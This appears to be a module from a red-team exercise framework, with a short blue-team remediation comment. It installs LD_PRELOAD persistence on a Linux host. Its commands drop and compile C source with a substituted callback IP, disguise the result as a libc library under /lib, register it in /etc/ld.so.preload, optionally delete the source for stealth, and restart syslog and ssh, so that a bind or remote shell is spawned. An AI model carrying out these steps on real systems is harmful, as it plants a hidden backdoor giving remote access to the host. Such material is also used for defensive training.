#DESC ld_preload stuff
#LEVEL 1

# BLUE TEAM INFO
# LD_PRELOAD will let you overwrite or add additional code to function calls. However, it's very easy to remove, compared to an LKM-- but it's also much much easier to write. In this case, we're spawning a bind or remote shell.
# REMEDIATION: Ensure that you don't have LD_PRELOAD environmental variable defined, and make sure that /etc/ld.so.preload is empty or non-existent. Also, have tight firewall egress rules.

# Drop the source code for the module and replace the callback ip with one of ours.
#DROP ld_man_preload.c /tmp/lib_man_so.c
sed -ie "s/CALLBACK_IP/#CALLBACK_IP/g" /tmp/lib_man_so.c

# Compile it.
cd /tmp
gcc lib_man_so.c -fPIC -shared -D_GNU_SOURCE -o libc.man.so.6 -ldl
mv libc.man.so.6 /lib/libc.man.so.6

# If stealthy, remove the source.
#IF stealthy
rm /tmp/lib_man_so.c
#ENDIF

# Create the LD Preload directive.
echo "/lib/libc.man.so.6" > /etc/ld.so.preload

systemctl restart syslog || systemctl restart syslogd || service syslog restart
systemctl restart ssh || systemctl restart sshd || service ssh restart
